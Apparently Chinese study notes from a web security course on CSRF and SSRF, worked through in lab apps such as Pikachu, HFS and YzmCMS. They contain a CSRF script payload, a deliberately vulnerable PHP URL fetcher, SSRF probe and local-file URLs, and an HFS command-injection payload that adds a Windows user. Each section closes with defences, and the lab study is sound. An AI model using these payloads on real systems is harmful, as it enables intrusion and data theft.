
# 一、CSRF 简介与危害
CSRF（Cross-site request forgery）简称：跨站请求伪造，存在巨大的危害性。在 CSRF 的
攻击场景中，攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点
击，用户一旦点击了这个请求，整个攻击就完成了，所以 CSRF 攻击也称为 one-click attack。

安装 pikachu
https://github.com/zhuifengshaonianhanlu/pikachu

恶意网站：
```
<script src='http://localhost/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=gg&phonenum=1111&add=11111&email=111111&submit=submit'>
</script>
gao qin dong zuo pian
```

或者修改时使用BurpSuite:
Engagement tools->generate CSRF POC


POC放到远程恶意服务器上，然后本地浏览器访问http://192.168.163.133/csrf01.html，点击后即会修改资料信息。


CSRFTester-1.0 端口号和浏览器保持一致
案例 1:MetInfo
![[Pasted image 20241031180347.png]]
注意数据表非空字段限制！


案例 2：zblog






总结：
HTTP_REFERER不同
预防：
同源策略
关键业务验证（短信，邮件、人脸识别）






# 二、SSRF 简介与危害

SSRF(Server-Side Request Forgery,服务器请求伪造)是一种由攻击者构造请求,由服务端发
起请求的安全漏洞,一般情况下,SSRF 攻击的目标是外网无法访问的内网系统(正因为请求时由
服务端发起的,所以服务端能请求到与自身相连而与外网隔绝的内部系统)。
攻击者通过篡改 URL 路径遍历或完全替换它来操纵 URL， 以向他们选择的任意域发出 HTTP
请求。 SSRF 攻击可以利用链接到组织基础架构内，不应向用户公开的内部服务或用户不应访问外部系统的URL。


新建ssrf.php：
```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>SSRF</title>
</head>

<body>
远程图片加载器
<form action="" method="POST">
请输入图片地址：<input type='text' name='url'>
<input type='submit' value="提交">
</form>
</body>

<?php
$_POST['url'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_POST['url']);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_exec($ch);
curl_close($ch);
?>
```

访问外部网站图片链接：
![[Pasted image 20241101105301.png]]


案例 1：内网探测 http
http://127.0.0.1:80
http://127.0.0.1:3306/

案例 2：读取本地文件 file
file://C:\Users\86188\Desktop\pwd.txt

案例 3：探测 ftp
ftp://192.168.0.19:21

总结危害：
@ 端口扫描
@ 内网 Web 应用指纹识别
@ 攻击内网 Web 应用
@ 读取本地文件


HFS漏洞
```
攻击 payload 及过程：
Payload：
http://192.168.0.2:8080/?search==%00{.exec|cmd.exe /c [Command-String].}
攻击过程实例：
http://192.168.0.2:8080/?search==%00{.exec|cmd.exe /c net user test1234 1234 /add.}



```

![[Pasted image 20241101113037.png]]

```
测试：
查看当前用户
net user
攻击
http://192.168.0.2:8080/?search==%00{.exec|cmd.exe%20/c%20net%20user%20test1234%201234%20/add.}
再次看用户
net user
删除用户
net user test1234 /del


防御手段：
1、禁止跳转。
2、限制协议。
3、内外网限制。
4、URL限制。
```



YzmCMS 漏洞
```
1.登录管理
http://localhost/yzm/admin/index/login.html
2.新增 html 页面
放到 yzmCMS 根目录
<ssrf>
<a href="file://C:\Users\86188\Desktop\tool\pwd.txt">ssrf demo</a>
</ssrf>

3.新增采集任务



```


![[Pasted image 20241101120116.png]]

4.测试

![[Pasted image 20241101120141.png]]


==============================================================================================================================


SSRF 成因与防御

==原因==
==由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制==

防御

==检验参数，不允许内网段 IP 操作==
==限制协议为 HTTP、HTTPS,禁用不需要的协议可以防止类似于 file:// ftp:// 等引起的问题统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。==
==过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准==

==============================================================================================================================
